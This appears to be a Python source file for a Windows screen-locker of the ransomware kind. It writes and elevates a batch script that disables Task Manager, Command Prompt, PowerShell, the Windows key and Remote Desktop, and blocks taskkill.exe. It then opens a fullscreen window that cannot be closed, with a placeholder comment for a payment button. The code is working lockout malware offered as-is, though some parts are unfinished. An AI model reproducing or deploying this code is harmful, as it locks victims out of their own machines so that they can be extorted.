import tkinter as tk
from tkinter import messagebox
import os
import sys
import subprocess

# Define the content of the batch file
batch_content = '''@echo off
:: Check if the script is running as administrator
NET SESSION >nul 2>&1
if %errorlevel% neq 0 (
    :: Re-launch the batch script as administrator using PowerShell
    powershell -Command "Start-Process cmd -ArgumentList '/c', '%%~f0' -Verb runAs"
    exit /b
)

:: Disable Task Manager
echo Disabling Task Manager...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: Disable Command Prompt
echo Disabling Command Prompt...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 2 /f

:: Disable PowerShell
echo Disabling PowerShell...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePowershell /t REG_DWORD /d 1 /f

:: Prevent taskkill from running (make it read-only)
echo Preventing taskkill.exe from being executed...
icacls "C:\Windows\System32\taskkill.exe" /deny Everyone:(R)

:: Disable Windows Key
echo Disabling Windows Key without restart...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f

:: Refresh Explorer to apply changes immediately
taskkill /im explorer.exe /f >nul 2>&1
start explorer.exe

:: Disable Remote Desktop
echo Disabling Remote Desktop...
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
pause
'''

# Path where the batch file will be created
batch_file = 'admin_script.bat'

# Create the batch file
with open(batch_file, 'w') as f:
    f.write(batch_content)

# Run the batch file with administrator privileges without prompts
try:
    # Command to execute the batch file with administrator rights
    subprocess.run(['powershell', '-Command', f'Start-Process cmd -ArgumentList "/c {os.path.abspath(batch_file)}" -Verb runAs'], check=True)
except subprocess.CalledProcessError as e:
    print(f"Error while trying to run the batch file with administrator privileges: {e}")
    
# Create the GUI application
def create_fullscreen_app():
    root = tk.Tk()

    # Make the window full screen and unexitable
    root.attributes('-fullscreen', True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable the close button

    # Set gray background
    root.configure(bg="gray")

    # Add a Payment button

    root.mainloop()


def exit_app():
    root.destroy()